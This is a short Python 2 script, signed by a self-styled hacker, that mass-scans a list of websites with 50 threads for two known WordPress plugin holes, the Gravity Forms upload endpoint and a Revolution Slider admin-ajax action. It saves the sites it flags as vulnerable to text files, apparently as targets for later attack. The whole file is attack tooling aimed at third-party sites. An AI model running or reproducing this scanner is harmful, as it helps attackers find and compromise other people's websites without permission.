
#!/usr/bin/python

import requests, sys
from multiprocessing.dummy import Pool

# Coded By RxR HaCkEr


try:
    with  open(sys.argv[1], 'r') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))



def Check_url(url):

    try:
		

		
		lib = requests.get(url+'/?gf_page=upload')
		
		if '{"status"' in lib.content:
			print '[Target]: {}	 ===> [+] Success ! '.format(url)
			open('Gravity.txt', 'a').write(url+'\n')
		else:
			print "[Target]: {} ===> [-] Not vuln !".format(url)
			
			
			
			
		revslider = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
						

		
		lib2 = requests.post(url+'/wp-admin/admin-ajax.php',data=revslider)
		
		if '/admin.php?page=revslider' in lib2.content:
			print '[Target]: {}	 ===> [+] Success ! '.format(url)
			open('revslider.txt', 'a').write(url+'\n')
		else:
			print "[Target]: {} ===> [-] Not vuln !".format(url)
    except:
        pass


def Main():

    try:
        Theards = Pool(50)
        Theard = Theards.map(Check_url, ooo)
        print("Finished, saved to : Gravity.txt , revslider.txt")
    except:
        pass


if __name__ == '__main__':
    Main()
